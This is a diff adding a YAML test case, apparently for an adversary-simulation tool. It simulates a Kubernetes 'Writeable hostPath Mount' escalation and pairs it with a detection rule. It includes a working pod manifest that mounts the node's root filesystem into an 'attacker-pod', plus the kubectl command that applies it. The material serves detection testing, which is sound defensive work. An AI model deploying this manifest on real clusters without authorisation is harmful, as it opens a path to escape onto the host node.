@@ -1,0 +1,66 @@
+---
+name: Writeable hostPath Mount
+author: Leo Tsaousis
+category: "Privilege Escalation"
+description: |
+  Create a container with a writeable hostPath mount
+
+  A hostPath volume mounts a directory or a file from the node to the container. Attackers who have permissions to create a new pod in the cluster may create one with a writable hostPath volume and chroot to escape to the underlying node.
+
+  This test case simulates the first step of this attack, by creating a pod with a hostPath mount.
+mitre_ids:
+  - T611
+platform: kubernetes
+permissions:
+  - namespaced: true
+    apiGroups: [""] 
+    resources:
+    - pods
+    verbs: 
+    - create
+    - get  
+input_arguments:
+  custom_yaml:
+    description: YAML manifest for the pod - leave this empty to use the default spec that performs the TTP
+    type: file
+    value: 
+      apiVersion: v1
+      kind: Pod
+      metadata:
+        labels:
+          run: attacker-pod
+        name: attacker-pod
+      spec:
+        volumes:
+        - name: host-fs
+          hostPath:
+            path: /
+        containers:
+        - image: ubuntu
+          name: attacker-pod
+          command: ["/bin/sh", "-c", "sleep infinity"]
+          volumeMounts:
+          - name: host-fs
+            mountPath: /host
+executors:
+  sh:
+    code: |
+      kubectl -f /tmp/custom.yml apply
+  leonidas_kube:
+    implemented: True
+detection:
+  sigma_id: 402b955c-8fe0-4a8c-b635-622b4ac5f902
+  status: experimental
+  level: low
+  sources: 
+  - name: audit
+    attributes: 
+      apiGroup: ""
+      resource: pods      
+      verb: create
+      hostPath: '*'
+  falsepositives:
+    - Various legitimate reasons exist for using hostPath mounts, such as running containers that need node-level access to e.g. transfer logs to a central location, or exposing host configuration files to static pods 
+references: 
+- https://microsoft.github.io/Threat-Matrix-for-Kubernetes/techniques/Writable%20hostPath%20mount/
+- https://kubenomicon.com/Persistence/Writable_hostPath_mount.html
